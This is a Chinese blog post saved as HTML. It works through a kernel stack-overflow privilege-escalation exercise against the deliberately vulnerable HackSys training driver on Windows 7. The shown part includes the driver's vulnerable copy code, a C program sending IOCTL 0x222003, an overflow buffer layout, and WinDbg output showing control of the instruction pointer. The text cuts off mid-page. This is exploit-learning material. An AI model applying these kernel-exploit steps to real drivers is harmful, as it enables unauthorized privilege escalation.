@@ -1,0 +1,944 @@
+<!DOCTYPE html>
+
+
+
+
+<html class="theme-next muse" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="内核漏洞,漏洞利用,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="giantbranch's blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="打造双机调试环境自己搜索资料 首先加载有漏洞的驱动  之后我们可以从windbg查看加载的模块，命令：lm  看一下第一个StackOverflow的代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656">
+<meta name="keywords" content="内核漏洞,漏洞利用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内核缓冲区溢出学习之第一个内核缓冲区溢出提权">
+<meta property="og:url" content="https://www.giantbranch.cn/2017/08/24/内核缓冲区溢出学习之第一个内核缓冲区溢出提权/index.html">
+<meta property="og:site_name" content="giantbranch&#39;s blog">
+<meta property="og:description" content="打造双机调试环境自己搜索资料 首先加载有漏洞的驱动  之后我们可以从windbg查看加载的模块，命令：lm  看一下第一个StackOverflow的代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic1503541063930.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic1503558874331.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic1503554518694.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic1503554743186.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic1503559909059.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic1503559939533.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic1503560120645.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic1503560224372.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic1503561743220.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic1503565542755.jpg">
+<meta property="og:updated_time" content="2023-10-13T13:14:33.130Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="内核缓冲区溢出学习之第一个内核缓冲区溢出提权">
+<meta name="twitter:description" content="打造双机调试环境自己搜索资料 首先加载有漏洞的驱动  之后我们可以从windbg查看加载的模块，命令：lm  看一下第一个StackOverflow的代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656">
+<meta name="twitter:image" content="http://pic.giantbranch.cn/pic1503541063930.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://www.giantbranch.cn/2017/08/24/内核缓冲区溢出学习之第一个内核缓冲区溢出提权/">
+
+
+
+
+
+  <title>内核缓冲区溢出学习之第一个内核缓冲区溢出提权 | giantbranch's blog</title>
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-121265336-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?e3a097ddc6964e154e65d478725ac9ed";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">giantbranch's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">忘掉掌声，按自己的方式，继续前行，跑过一生</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-book">
+          <a href="/book/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-book"></i> <br>
+            
+            读过的书
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
+            
+            站点地图
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.giantbranch.cn/2017/08/24/内核缓冲区溢出学习之第一个内核缓冲区溢出提权/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="giantbranch">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="giantbranch's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">内核缓冲区溢出学习之第一个内核缓冲区溢出提权</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-24T00:00:00+00:00">
+                2017-08-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/08/24/内核缓冲区溢出学习之第一个内核缓冲区溢出提权/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2017/08/24/内核缓冲区溢出学习之第一个内核缓冲区溢出提权/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>打造双机调试环境自己搜索资料</p>
+<p>首先加载有漏洞的驱动</p>
+<p><img src="http://pic.giantbranch.cn/pic1503541063930.jpg" alt="使用OSR加载内存"></p>
+<p>之后我们可以从windbg查看加载的模块，命令：lm</p>
+<p><img src="http://pic.giantbranch.cn/pic1503558874331.jpg" alt></p>
+<p>看一下第一个StackOverflow的代码</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"StackOverflow.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> ALLOC_PRAGMA</span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">pragma</span> alloc_text(PAGE, TriggerStackOverflow)</span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">pragma</span> alloc_text(PAGE, StackOverflowIoctlHandler)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// ALLOC_PRAGMA</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> auto_inline(off)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Trigger the Stack Overflow Vulnerability</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name="UserBuffer"&gt;The pointer to user mode buffer&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name="Size"&gt;Size of the user mode buffer&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;NTSTATUS&lt;/returns&gt;</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">TriggerStackOverflow</span><span class="params">(IN PVOID UserBuffer, IN SIZE_T Size)</span> </span>&#123;</span><br><span class="line">    NTSTATUS Status = STATUS_SUCCESS;</span><br><span class="line">    ULONG KernelBuffer[BUFFER_SIZE] = &#123;<span class="number">0</span>&#125;; <span class="comment">//内核buffer</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//这个宏可以确保调用线程运行在一个允许分页的足够低IRQL级别。</span></span><br><span class="line">    PAGED_CODE();</span><br><span class="line"></span><br><span class="line">    __try &#123;</span><br><span class="line">        <span class="comment">// Verify if the buffer resides in user mode</span></span><br><span class="line">        <span class="comment">// The ProbeForRead routine checks that a user-mode buffer actually resides in the user portion of the address space, and is correctly aligned.</span></span><br><span class="line">        ProbeForRead(UserBuffer, <span class="keyword">sizeof</span>(KernelBuffer), (ULONG)__alignof(KernelBuffer));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出调试信息</span></span><br><span class="line">        DbgPrint(<span class="string">"[+] UserBuffer: 0x%p\n"</span>, UserBuffer);</span><br><span class="line">        DbgPrint(<span class="string">"[+] UserBuffer Size: 0x%X\n"</span>, Size);</span><br><span class="line">        DbgPrint(<span class="string">"[+] KernelBuffer: 0x%p\n"</span>, &amp;KernelBuffer);</span><br><span class="line">        DbgPrint(<span class="string">"[+] KernelBuffer Size: 0x%X\n"</span>, <span class="keyword">sizeof</span>(KernelBuffer));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SECURE</span></span><br><span class="line">        <span class="comment">// Secure Note: This is secure because the developer is passing a size</span></span><br><span class="line">        <span class="comment">// equal to size of KernelBuffer to RtlCopyMemory()/memcpy(). Hence,</span></span><br><span class="line">        <span class="comment">// there will be no overflow</span></span><br><span class="line">        <span class="comment">// 这个是安全的，应该这里以内核buffer的大小做复制</span></span><br><span class="line">        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, <span class="keyword">sizeof</span>(KernelBuffer));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">        DbgPrint(<span class="string">"[+] Triggering Stack Overflow\n"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Vulnerability Note: This is a vanilla Stack based Overflow vulnerability</span></span><br><span class="line">        <span class="comment">// because the developer is passing the user supplied size directly to</span></span><br><span class="line">        <span class="comment">// RtlCopyMemory()/memcpy() without validating if the size is greater or</span></span><br><span class="line">        <span class="comment">// equal to the size of KernelBuffer</span></span><br><span class="line">        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER) &#123;</span><br><span class="line">        Status = GetExceptionCode();</span><br><span class="line">        DbgPrint(<span class="string">"[-] Exception Code: 0x%X\n"</span>, Status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Stack Overflow Ioctl Handler</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name="Irp"&gt;The pointer to IRP&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name="IrpSp"&gt;The pointer to IO_STACK_LOCATION structure&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;NTSTATUS&lt;/returns&gt;</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">StackOverflowIoctlHandler</span><span class="params">(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp)</span> </span>&#123;</span><br><span class="line">    SIZE_T Size = <span class="number">0</span>;</span><br><span class="line">    PVOID UserBuffer = <span class="literal">NULL</span>;</span><br><span class="line">    NTSTATUS Status = STATUS_UNSUCCESSFUL;</span><br><span class="line"></span><br><span class="line">    UNREFERENCED_PARAMETER(Irp);</span><br><span class="line">    PAGED_CODE();</span><br><span class="line"></span><br><span class="line">    UserBuffer = IrpSp-&gt;Parameters.DeviceIoControl.Type3InputBuffer;</span><br><span class="line">    Size = IrpSp-&gt;Parameters.DeviceIoControl.InputBufferLength;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (UserBuffer) &#123;</span><br><span class="line">        <span class="comment">// 触发缓冲区溢出</span></span><br><span class="line">        Status = TriggerStackOverflow(UserBuffer, Size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> auto_inline()</span></span><br></pre></td></tr></table></figure>
+
+<p>这个代码的漏洞原理很简单，就是下面这一行，最后的size是用户可控的，而不是安全的sizeof(KernelBuffer)</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RtlCopyMemory((<span class="name">PVOID</span>)KernelBuffer, UserBuffer, Size)<span class="comment">;</span></span><br></pre></td></tr></table></figure>
+
+<p>先了解一下程序</p>
+<p>我们从ida可以看到IOCTL为0x222003时跳转到StackOverflowIoctlHandler</p>
+<p><img src="http://pic.giantbranch.cn/pic1503554518694.jpg" alt></p>
+<p>接下来我们进入TriggerStackOverflow函数看看，可以看到KernelBuffer的大小为0x800（0x81c-0x1c）</p>
+<p><img src="http://pic.giantbranch.cn/pic1503554743186.jpg" alt></p>
+<p>我们开始编写程序</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hDevice;</span><br><span class="line">	DWORD length = <span class="number">0</span>;</span><br><span class="line">	BOOL ret;</span><br><span class="line">	<span class="keyword">char</span> UserBuffer[] = <span class="string">"giantbranch"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 打开设备驱动（下面为什么这么多\,因为转义啊）</span></span><br><span class="line">	hDevice = CreateFile(<span class="string">"\\\\.\\HacksysExtremeVulnerableDriver"</span>, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="number">0</span>, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"打开设备驱动出错\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ret = DeviceIoControl(hDevice,      <span class="comment">//驱动句柄</span></span><br><span class="line">		<span class="number">0x222003</span>,       <span class="comment">//IoControlCode</span></span><br><span class="line">		UserBuffer,     <span class="comment">//输入缓冲区指针</span></span><br><span class="line">		<span class="number">11</span>,             <span class="comment">//输入缓冲区长度</span></span><br><span class="line">		<span class="literal">NULL</span>,           <span class="comment">//输出缓冲区指针</span></span><br><span class="line">		<span class="number">0</span>,              <span class="comment">//输出缓冲区长度</span></span><br><span class="line">		&amp;length,        <span class="comment">//返回实际的数据字节数</span></span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!ret)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"DeviceIoControl失败\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"DeviceIoControl成功\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	CloseHandle(hDevice);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行</p>
+<p><img src="http://pic.giantbranch.cn/pic1503559909059.jpg" alt></p>
+<p>但是windbg没有任何回应啊</p>
+<p><img src="http://pic.giantbranch.cn/pic1503559939533.jpg" alt></p>
+<p>后来发现是什么没开什么的（<a href="http://www.osronline.com/article.cfm?article=295）" target="_blank" rel="noopener">http://www.osronline.com/article.cfm?article=295）</a></p>
+<p>使用 ed nt!Kd_DEFAULT_MASK 8 即可收到DbgPrint的输出，我们重启启动驱动就可以看到输出了</p>
+<p><img src="http://pic.giantbranch.cn/pic1503560120645.jpg" alt></p>
+<p>在运行我们编写的程序，就可以看到输出了，可以看到成功打入含有缓冲区溢出的代码</p>
+<p><img src="http://pic.giantbranch.cn/pic1503560224372.jpg" alt></p>
+<p>我们发送下面的字符看看</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">memset(UserBuffer, <span class="number">0x41</span>, UserBufferSize);</span><br><span class="line">for (int i = <span class="number">0</span>; i &lt; <span class="number">52</span>; i = i + <span class="number">4</span>)&#123;</span><br><span class="line">  memset(UserBuffer + <span class="number">2048</span> + i , <span class="number">0x41</span> + i , <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>果然崩溃了，!analyze -v分析一下</p>
+<p><img src="http://pic.giantbranch.cn/pic1503561743220.jpg" alt></p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: kd&gt; !analyze -v</span><br><span class="line">Connected to Windows <span class="number">7</span> <span class="number">7601</span> x86 compatible target at (Thu Aug <span class="number">24</span> <span class="number">16</span>:<span class="number">02</span>:<span class="number">14.817</span> <span class="number">2017</span> (UTC + <span class="number">8</span>:<span class="number">00</span>)), ptr64 FALSE</span><br><span class="line">Loading Kernel Symbols</span><br><span class="line">...............................................................</span><br><span class="line">................................................................</span><br><span class="line">..........................</span><br><span class="line">Loading User Symbols</span><br><span class="line">....</span><br><span class="line">Loading unloaded <span class="keyword">module</span> list</span><br><span class="line">.......</span><br><span class="line">*******************************************************************************</span><br><span class="line">*                                                                             *</span><br><span class="line">*                        Bugcheck Analysis                                    *</span><br><span class="line">*                                                                             *</span><br><span class="line">*******************************************************************************</span><br><span class="line"></span><br><span class="line">Unknown bugcheck <span class="keyword">code</span> (<span class="number">0</span>)</span><br><span class="line">Unknown bugcheck description</span><br><span class="line">Arguments:</span><br><span class="line">Arg1: <span class="number">00000000</span></span><br><span class="line">Arg2: <span class="number">00000000</span></span><br><span class="line">Arg3: <span class="number">00000000</span></span><br><span class="line">Arg4: <span class="number">00000000</span></span><br><span class="line"></span><br><span class="line">Debugging Details:</span><br><span class="line">------------------</span><br><span class="line"></span><br><span class="line">*** ERROR: Symbol file could not be found.  Defaulted to <span class="keyword">export</span> symbols for KERNELBASE.dll - </span><br><span class="line">*** ERROR: Symbol file could not be found.  Defaulted to <span class="keyword">export</span> symbols for kernel32.dll - </span><br><span class="line">*** WARNING: Unable to verify checksum for ConsoleApplication1.exe</span><br><span class="line">*** ERROR: Module load completed but symbols could not be loaded for ConsoleApplication1.exe</span><br><span class="line"></span><br><span class="line">PROCESS_NAME:  ConsoleApplica</span><br><span class="line"></span><br><span class="line">FAULTING_IP: </span><br><span class="line">+<span class="number">1</span>b</span><br><span class="line"><span class="number">61616161</span> ??              ???</span><br><span class="line"></span><br><span class="line">EXCEPTION_RECORD:  ffffffff -- (.exr <span class="number">0xffffffffffffffff</span>)</span><br><span class="line">ExceptionAddress: <span class="number">61616161</span></span><br><span class="line">   ExceptionCode: c0000005 (Access violation)</span><br><span class="line">  ExceptionFlags: <span class="number">00000008</span></span><br><span class="line">NumberParameters: <span class="number">2</span></span><br><span class="line">   Parameter[<span class="number">0</span>]: <span class="number">00000008</span></span><br><span class="line">   Parameter[<span class="number">1</span>]: <span class="number">61616161</span></span><br><span class="line">Attempt to execute non-executable address <span class="number">61616161</span></span><br><span class="line"></span><br><span class="line">ERROR_CODE: (NTSTATUS) <span class="number">0xc0000005</span> - <span class="number">0</span>x%p</span><br><span class="line"></span><br><span class="line">EXCEPTION_CODE: (NTSTATUS) <span class="number">0xc0000005</span> - <span class="number">0</span>x%p</span><br><span class="line"></span><br><span class="line">EXCEPTION_PARAMETER1:  <span class="number">00000008</span></span><br><span class="line"></span><br><span class="line">EXCEPTION_PARAMETER2:  <span class="number">61616161</span></span><br><span class="line"></span><br><span class="line">WRITE_ADDRESS:  <span class="number">61616161</span> </span><br><span 